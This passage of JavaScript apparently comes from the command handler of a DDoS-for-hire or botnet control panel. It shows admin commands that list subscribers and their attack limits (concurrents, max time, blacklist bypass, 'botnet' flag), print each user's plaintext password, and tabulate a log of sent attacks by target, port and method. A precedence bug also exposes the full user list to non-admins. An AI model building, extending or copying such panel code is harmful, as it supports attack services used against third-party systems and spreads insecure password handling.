        if (!targetUsername) 
        {
            stream.write('usage: viewplan <username>\r\n');
            return;
        }
        if (targetUsername === 'root' && user.username !== 'root') 
        {
            stream.write('Only root can view this plan.\r\n');
            return;
        }
        const userData = await db.findDocumentByKey('username', targetUsername, config.mongo_db_collection);
        if (!userData) 
        {
            stream.write('User not found.\r\n');
            return;
        }
        stream.write(`\r\n[2J[H[38;5;39m┌─ [97mUsername: ${userData.username}\r\n`);
        stream.write(`[38;5;39m├─ [97mPassword: ${userData.password}\r\n`);
        stream.write(`[38;5;39m├─ [97mRole: ${userData.role}\r\n`);
        stream.write(`[38;5;39m├─ [97mExpiry: ${userData.expiry}\r\n`);
        stream.write(`[38;5;39m├─ [97mMax Time: ${userData.maxTime}\r\n`);
        stream.write(`[38;5;39m├─ [97mConcurrents: ${userData.concurrents}\r\n`);
        stream.write(`[38;5;39m├─ [97mAdmin: ${userData.admin}\r\n`);
        stream.write(`[38;5;39m├─ [97mReseller: ${userData.reseller}\r\n`);
        stream.write(`[38;5;39m├─ [97mAPI Access: ${userData.api}\r\n`);
        stream.write(`[38;5;39m├─ [97mSpam Bypass: ${userData.spambypass}\r\n`);
        stream.write(`[38;5;39m├─ [97mBlacklist Bypass: ${userData.blacklistbypass}\r\n`);
        stream.write(`[38;5;39m├─ [97mVIP: ${userData.vip}\r\n`);
        stream.write(`[38;5;39m├─ [97mHome Holder: ${userData.homeholder}\r\n`);
        stream.write(`[38;5;39m├─ [97mbotnet: ${userData.botnet}\r\n`);
        stream.write(`[38;5;39m├─ [97mBanned: ${userData.banned}\r\n`);
        stream.write(`[38;5;39m└─ [97mCooldown: ${userData.cooldown}\r\n`);
    }
    else if (command === 'showlogs' && user.admin) 
    {
        console.log('Looking for attack log at:', attacklogs);
        if (fs.existsSync(attacklogs)) 
        {
            const lines = fs.readFileSync(attacklogs, 'utf-8').trim().split('\n');
            const entries = [];
            const headers = ['#', 'User', 'Target', 'Port', 'Time', 'Method', 'Datetime'];
            const maxLengths = 
            {
                '#': 1,
                User: 'User'.length,
                Target: 'Target'.length,
                Port: 'Port'.length,
                Time: 'Time'.length,
                Method: 'Method'.length,
                Datetime: 'Datetime'.length
            };

            lines.forEach((line, index) => 
            {
                try 
                {
                    const jsonMatch = line.match(/Sent attack (.*)$/);
                    if (jsonMatch && jsonMatch[1]) 
                    {
                        const entry = JSON.parse(jsonMatch[1]);
                        const row = 
                        {
                            '#': (entries.length + 1).toString(),
                            User: entry.user || 'N/A',
                            Target: entry.target || 'N/A',
                            Port: entry.port?.toString() || 'N/A',
                            Time: entry.time?.toString() || 'N/A',
                            Method: entry.method || 'N/A',
                            Datetime: entry.datetime || 'N/A'
                        };
                        for (const key in row) 
                        {
                            if (row[key].length > maxLengths[key]) 
                            {
                                maxLengths[key] = row[key].length;
                            }
                        }
                        entries.push(row);
                    }
                } 
                catch { }
            });
            globalThis.clearScreen(stream);
            const headerLine = headers.map(h => h.padEnd(maxLengths[h])).join('  ') + '\r\n';
            stream.write(headerLine);
            stream.write(`${'='.repeat(headerLine.length - 2)}\r\n`);
            entries.forEach((entry, idx) => 
            {
                entry['#'] = (idx + 1).toString();
                const rowLine = headers.map(h => entry[h].padEnd(maxLengths[h])).join('  ') + '\r\n';
                stream.write(rowLine);
            });
            const malformedLines = lines.length - entries.length;
            if (malformedLines > 0) 
            {
                stream.write(`\r\n[${malformedLines} malformed log line${malformedLines > 1 ? 's' : ''} skipped]\r\n`);
            }
        } 
        else 
        {
            stream.write('Log file not found.\r\n');
        }
    }
    else if (command == 'online' && user.admin) 
    {
        globalThis.clearScreen(stream);
        const activeUserMap = new Map();
        for (const session of activeSessions.values()) 
        {
            if (session?.user?.username) 
            {
                activeUserMap.set(session.user.username, session.user);
            }
        }
        const updatedUsers = [...activeUserMap.values()].map((u, i) => 
        {
            const expiryDays = globalThis.getExpiryDays(u.expiry);
            return {
                index: i + 1,
                username: u.username || '',
                maxTime: u.maxTime || 0,
                concurrents: u.concurrents || 0,
                cooldown: u.cooldown || 0,
                expiry: u.expiry || 'N/A',
                expiryDays,
                isNew: expiryDays <= 3 ? 'Yes' : 'No',
                ranks: [u.vip && 'V', u.admin && 'A', u.reseller && 'R'].filter(Boolean).join('   ')
            };
        });
    
        const colWidths = 
        {
            index: Math.max(...updatedUsers.map(u => u.index.toString().length), 1),
            username: Math.max(...updatedUsers.map(u => u.username.length), 4),
            maxTime: Math.max(...updatedUsers.map(u => u.maxTime.toString().length), 4),
            concurrents: Math.max(...updatedUsers.map(u => u.concurrents.toString().length), 5),
            cooldown: Math.max(...updatedUsers.map(u => u.cooldown.toString().length), 2),
            expiry: Math.max(...updatedUsers.map(u => u.expiry.length), 6),
            ranks: Math.max(...updatedUsers.map(u => u.ranks.length), 5),
        };
    
        const header = `#${' '.repeat(colWidths.index)} ` +
                `User${' '.repeat(colWidths.username - 4 + 2)}` +
                `Time${' '.repeat(colWidths.maxTime - 4 + 2)}` +
                `Concs${' '.repeat(colWidths.concurrents - 5 + 2)}` +
                `CD${' '.repeat(colWidths.cooldown - 2 + 2)}` +
                `Expiry${' '.repeat(colWidths.expiry - 6 + 2)}` +
                `New   Ranks\r\n` +
                `${'='.repeat(5)}${' '.repeat(colWidths.index - 1)}` +
                `${'='.repeat(colWidths.username + 2)}` +
                `${'='.repeat(colWidths.maxTime + 2)}` +
                `${'='.repeat(colWidths.concurrents + 2)}` +
                `${'='.repeat(colWidths.cooldown + 2)}` +
                `${'='.repeat(colWidths.expiry + 2)}` +
                `${'='.repeat(7)}` +
                `${'='.repeat(colWidths.ranks + 2)}\r\n`;
        stream.write(`\r${header}`);
        const userList = updatedUsers.map(u => 
          u.index.toString().padEnd(colWidths.index + 1) +
          u.username.padEnd(colWidths.username + 2) +
          u.maxTime.toString().padEnd(colWidths.maxTime + 2) +
          u.concurrents.toString().padEnd(colWidths.concurrents + 2) +
          u.cooldown.toString().padEnd(colWidths.cooldown + 2) +
          u.expiry.padEnd(colWidths.expiry + 2) +
          u.isNew.padEnd(7) +
          u.ranks.padEnd(colWidths.ranks + 2)
        ).join('\r\n');
        stream.write(`\x1B[97m${userList}\r\n`);
    }
    else if (command === 'users' || command === 'users list' && user.admin) 
    {
        pauseRef.value = true;
        globalThis.clearScreen(stream);
        const collection = db.getCollection(config.mongo_db_collection);
        const allUsers = await collection.find({}).toArray();
        const pageSize = 10;
        let currentPage = 0;

        const updatedUsers = allUsers.map((u, i) => 
        {
            const expiryDays = globalThis.getExpiryDays(u.expiry);
            return {
                index: i + 1,
                username: u.username || '',
                maxTime: u.maxTime || 0,
                concurrents: u.concurrents || 0,
                cooldown: u.cooldown || 0,
                expiry: u.expiry || 'N/A',
                expiryDays,
                isNew: expiryDays <= 3 ? '\x1B[97mYes\x1B[97m' : 'No',
                ranks: [u.vip && 'V', u.admin && 'A', u.reseller && 'R'].filter(Boolean).join('   ')
            };
        });
        
        const widths = 
        {
            index: Math.max(...updatedUsers.map(u => u.index.toString().length), 1),
            username: Math.max(...updatedUsers.map(u => u.username.length), 4),
            maxTime: Math.max(...updatedUsers.map(u => u.maxTime.toString().length), 4),
            concurrents: Math.max(...updatedUsers.map(u => u.concurrents.toString().length), 5),
            cooldown: Math.max(...updatedUsers.map(u => u.cooldown.toString().length), 2),
            expiry: Math.max(...updatedUsers.map(u => u.expiry.length), 6),
            ranks: Math.max(...updatedUsers.map(u => u.ranks.length), 5),
        };

        const drawPage = () => 
        {
            stream.write('\r\x1B[K');
            globalThis.clearScreen(stream);
            const header = 
                `#${' '.repeat(widths.index)}`  +
                ` User${' '.repeat(widths.username - 4 + 2)}` +
                `Time${' '.repeat(widths.maxTime - 4 + 2)}` +
                `Concs${' '.repeat(widths.concurrents - 5 + 2)}` +
                `CD${' '.repeat(widths.cooldown - 2 + 2)}` +
                `Expiry${' '.repeat(widths.expiry - 6 + 2)}` +
                `New   Ranks\r\n` +
                `${'-'.repeat(widths.index + 2)}` +
                `${'-'.repeat(widths.username + 2)}` +
                `${'-'.repeat(widths.maxTime + 2)}` +
                `${'-'.repeat(widths.concurrents + 2)}` +
                `${'-'.repeat(widths.cooldown + 2)}` +
                `${'-'.repeat(widths.expiry + 2)}` +
                ` ${'-'.repeat(7)}` +
                `${'-'.repeat(widths.ranks + 2)}\r\n`;
            stream.write(`\r${header}`);
            const start = currentPage * pageSize;
            const pageUsers = updatedUsers.slice(start, start + pageSize);
            const rows = pageUsers.map(u => 
                u.index.toString().padEnd(widths.index + 1) +
                u.username.padEnd(widths.username + 2) +
                u.maxTime.toString().padEnd(widths.maxTime + 2) +
                u.concurrents.toString().padEnd(widths.concurrents + 2) +
                u.cooldown.toString().padEnd(widths.cooldown + 2) +
                u.expiry.padEnd(widths.expiry + 2) +
                u.isNew.padEnd(7) +
                u.ranks.padEnd(widths.ranks + 2)
            ).join('\r\n');
    
            stream.write(`\x1B[97m${rows}\r\n`);
            stream.write(`\x1B[90m-- Page ${currentPage + 1}/${Math.ceil(updatedUsers.length / pageSize)} | Press 'n' for next, 'p' for prev, 'q' to quit --[97m\r\n`);
          };
      
          drawPage();
      
          await new Promise(resolve => 
          {
            const totalPages = Math.ceil(updatedUsers.length / pageSize);
            const onData = (data) => 
            {
                const key = data.toString().trim().toLowerCase();
                stream.write('\r\x1B[K');
                if (key === 'n') 
                {
                    if (currentPage + 1 < totalPages) 
                    {
                        currentPage++;
                        drawPage();
                    }
                    else
                    {
                        stream.write(`\r\x1B[90mAlready at last page.[97m\r\n`);
                    }
                } 
                else if (key === 'p') 
                {
                    if (currentPage > 0)
                    {
                        currentPage--;
                        drawPage();
                    }
                    else
                    {
                        stream.write(`\r\x1B[90mAlready at first page.[97m\r\n`);
                    }
                } 
                else if (key === 'q') 
                {
                    stream.removeListener('data', onData);
                    stream.write('\r[97m\rExiting user list...\r\n');
                    pauseRef.value = false;
                    resolve();
                } 
                else
                {
                    stream.write(`\x1B[31mInvalid input. Use n (next), p (previous), q (quit).[97m\r\n`);
                }
            };
            stream.on('data', onData);
        });
    }
    else
    {
        stream.write(`${pageContents.consoleerror}\r\n`);   
    }
}

globalThis.HandleCommands = HandleCommands;